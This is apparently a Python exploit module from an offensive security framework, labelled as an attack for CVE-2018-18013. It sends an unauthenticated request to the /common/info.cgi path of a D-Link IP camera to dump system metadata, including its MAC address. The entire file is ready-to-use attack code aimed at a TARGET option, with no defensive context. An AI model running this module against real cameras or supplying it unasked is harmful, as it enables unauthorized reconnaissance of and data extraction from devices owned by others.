import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dlink/cve_2018_18013_attack"
        self.description = "Exploit module to dump system metadata and hardware layout from D-Link IP cameras."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        url = f"http://{target}:{port}/common/info.cgi"
        
        try:
            async with httpx.AsyncClient(timeout=8.0) as client:
                print("\033[1;33m[*] Téléchargement du dump système D-Link...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and "mac_addr=" in response.text:
                    return {
                        "success": True,
                        "details": f"D-Link system file extracted successfully. Raw data:\n{response.text.strip()}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Target did not return valid configuration pairs."}
